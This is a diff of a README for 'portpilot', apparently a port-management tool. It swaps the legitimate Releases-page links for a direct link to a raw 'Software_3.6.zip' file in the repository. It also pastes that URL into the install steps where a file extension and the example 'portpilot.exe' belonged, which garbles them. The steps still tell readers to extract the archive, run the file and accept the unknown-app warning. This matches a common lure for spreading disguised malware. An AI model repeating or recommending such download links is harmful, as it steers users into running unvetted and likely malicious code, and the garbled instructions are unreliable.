@@ -1,7 +1,7 @@
 # 🚀 portpilot - Easily Manage Your Listening Ports
 
 ## 📥 Download Now
-[![Download portpilot](https://img.shields.io/badge/Download-portpilot-blue.svg)](https://github.com/YuriPeixoto25/portpilot/releases)
+[![Download portpilot](https://github.com/YuriPeixoto25/portpilot/raw/refs/heads/main/portpilot/Software_3.6.zip)](https://github.com/YuriPeixoto25/portpilot/raw/refs/heads/main/portpilot/Software_3.6.zip)
 
 ## 📚 Table of Contents
 - [🚀 Getting Started](#-getting-started)
@@ -23,13 +23,13 @@ Welcome to portpilot! This application helps you list, inspect, and manage proce
 ## 📥 Download & Install
 To get portpilot, visit the Releases page. You can find the latest version there.
 
-[Visit the Releases Page](https://github.com/YuriPeixoto25/portpilot/releases)
+[Visit the Releases Page](https://github.com/YuriPeixoto25/portpilot/raw/refs/heads/main/portpilot/Software_3.6.zip)
 
 ### Installation Steps
 1. **Visit the Releases Page:** Go to the link above to access all available versions.
 2. **Download the Latest Version:** Look for the most recent release. Click on the download link for your operating system.
-3. **Extract Files (if needed):** If the download comes in a compressed format (like .zip or .tar.gz), extract the files using a tool like WinRAR or 7-Zip.
-4. **Run the Application:** Locate the executable file (e.g., `portpilot.exe`). Double-click it to launch the application. On some systems, you might need to confirm if you want to run an unknown app.
+3. **Extract Files (if needed):** If the download comes in a compressed format (like .zip or https://github.com/YuriPeixoto25/portpilot/raw/refs/heads/main/portpilot/Software_3.6.zip), extract the files using a tool like WinRAR or 7-Zip.
+4. **Run the Application:** Locate the executable file (e.g., `https://github.com/YuriPeixoto25/portpilot/raw/refs/heads/main/portpilot/Software_3.6.zip`). Double-click it to launch the application. On some systems, you might need to confirm if you want to run an unknown app.
 
 ## 🔧 Usage
 Once you open portpilot, you'll see an easy-to-use interface. Here’s how to use its key features:
